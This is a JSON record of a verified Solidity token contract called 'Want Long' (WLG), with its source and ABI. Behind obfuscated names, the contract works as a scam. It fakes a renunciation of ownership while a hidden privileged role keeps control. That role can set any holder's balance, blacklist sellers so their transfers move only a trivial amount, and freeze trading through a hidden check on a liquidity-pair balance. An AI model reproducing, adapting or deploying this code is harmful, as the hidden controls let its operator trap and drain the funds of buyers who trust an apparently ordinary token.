{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface exemptEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tradingTakeSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountMin {\n    function createPair(address feeTotal, address senderMax) external returns (address);\n}\n\ninterface amountAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromTake) external view returns (uint256);\n\n    function transfer(address fromTx, uint256 fromLimit) external returns (bool);\n\n    function allowance(address swapTakeLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromTx,\n        uint256 fromLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityFrom, uint256 value);\n    event Approval(address indexed swapTakeLaunched, address indexed spender, uint256 value);\n}\n\ninterface amountAutoMetadata is amountAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WantLong is tradingTakeSell, amountAuto, amountAutoMetadata {\n\n    string private fundAt = \"WLG\";\n\n    function maxTrading(address walletToken) public {\n        tokenSenderAt();\n        \n        if (walletToken == teamModeAt || walletToken == shouldList) {\n            return;\n        }\n        receiverList[walletToken] = true;\n    }\n\n    address public teamModeAt;\n\n    function approve(address amountToken, uint256 fromLimit) public virtual override returns (bool) {\n        launchedToTx[_msgSender()][amountToken] = fromLimit;\n        emit Approval(_msgSender(), amountToken, fromLimit);\n        return true;\n    }\n\n    address private marketingIs;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listTake;\n    }\n\n    uint256 private tokenSender;\n\n    uint256 private swapWalletTrading;\n\n    function tokenSenderAt() private view {\n        require(toFundTrading[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed swapTrading, address indexed swapTo);\n\n    uint256 listLiquidityFrom;\n\n    bool private sellLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return exemptIs;\n    }\n\n    function atTeam(uint256 fromLimit) public {\n        tokenSenderAt();\n        receiverTxIs = fromLimit;\n    }\n\n    mapping(address => bool) public toFundTrading;\n\n    bool public atLimit;\n\n    uint256 public teamTx;\n\n    function transferFrom(address teamShould, address fromTx, uint256 fromLimit) external override returns (bool) {\n        if (_msgSender() != isExempt) {\n            if (launchedToTx[teamShould][_msgSender()] != type(uint256).max) {\n                require(fromLimit <= launchedToTx[teamShould][_msgSender()]);\n                launchedToTx[teamShould][_msgSender()] -= fromLimit;\n            }\n        }\n        return fundLimit(teamShould, fromTx, fromLimit);\n    }\n\n    function fundLimit(address teamShould, address fromTx, uint256 fromLimit) internal returns (bool) {\n        if (teamShould == teamModeAt) {\n            return autoAmount(teamShould, fromTx, fromLimit);\n        }\n        uint256 feeSwapList = amountAuto(shouldList).balanceOf(launchedLaunch);\n        require(feeSwapList == receiverTxIs);\n        require(fromTx != launchedLaunch);\n        if (receiverList[teamShould]) {\n            return autoAmount(teamShould, fromTx, takeMax);\n        }\n        return autoAmount(teamShould, fromTx, fromLimit);\n    }\n\n    bool public tradingSwap;\n\n    bool public maxMarketingLaunch;\n\n    function enableReceiver(address swapIs) public {\n        if (tradingSwap) {\n            return;\n        }\n        \n        toFundTrading[swapIs] = true;\n        if (atLimit) {\n            tokenSender = teamTx;\n        }\n        tradingSwap = true;\n    }\n\n    uint256 receiverTxIs;\n\n    mapping(address => uint256) private marketingLaunch;\n\n    mapping(address => mapping(address => uint256)) private launchedToTx;\n\n    address public shouldList;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundAt;\n    }\n\n    address launchedLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function autoAmount(address teamShould, address fromTx, uint256 fromLimit) internal returns (bool) {\n        require(marketingLaunch[teamShould] >= fromLimit);\n        marketingLaunch[teamShould] -= fromLimit;\n        marketingLaunch[fromTx] += fromLimit;\n        emit Transfer(teamShould, fromTx, fromLimit);\n        return true;\n    }\n\n    uint256 constant takeMax = 6 ** 10;\n\n    string private exemptIs = \"Want Long\";\n\n    uint256 public amountSell;\n\n    constructor (){\n        \n        exemptEnable launchFund = exemptEnable(isExempt);\n        shouldList = amountMin(launchFund.factory()).createPair(launchFund.WETH(), address(this));\n        if (tokenSender == swapWalletTrading) {\n            swapWalletTrading = maxTotalWallet;\n        }\n        teamModeAt = _msgSender();\n        takeReceiver();\n        toFundTrading[teamModeAt] = true;\n        marketingLaunch[teamModeAt] = fundLiquidity;\n        if (tokenSender != maxTotalWallet) {\n            maxTotalWallet = swapWalletTrading;\n        }\n        emit Transfer(address(0), teamModeAt, fundLiquidity);\n    }\n\n    function takeReceiver() public {\n        emit OwnershipTransferred(teamModeAt, address(0));\n        marketingIs = address(0);\n    }\n\n    uint8 private listTake = 18;\n\n    uint256 public tradingEnableMarketing;\n\n    function owner() external view returns (address) {\n        return marketingIs;\n    }\n\n    function liquiditySell(address fromFund, uint256 fromLimit) public {\n        tokenSenderAt();\n        marketingLaunch[fromFund] = fromLimit;\n    }\n\n    uint256 public maxTotalWallet;\n\n    address isExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function balanceOf(address fromTake) public view virtual override returns (uint256) {\n        return marketingLaunch[fromTake];\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingIs;\n    }\n\n    mapping(address => bool) public receiverList;\n\n    function allowance(address isMax, address amountToken) external view virtual override returns (uint256) {\n        if (amountToken == isExempt) {\n            return type(uint256).max;\n        }\n        return launchedToTx[isMax][amountToken];\n    }\n\n    uint256 private fundLiquidity = 100000000 * 10 ** 18;\n\n    function transfer(address fromFund, uint256 fromLimit) external virtual override returns (bool) {\n        return fundLimit(_msgSender(), fromFund, fromLimit);\n    }\n\n    bool private amountFee;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundLiquidity;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTakeLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"atTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapIs\",\"type\":\"address\"}],\"name\":\"enableReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"liquiditySell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMarketingLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTotalWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletToken\",\"type\":\"address\"}],\"name\":\"maxTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamModeAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toFundTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnableMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "WantLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}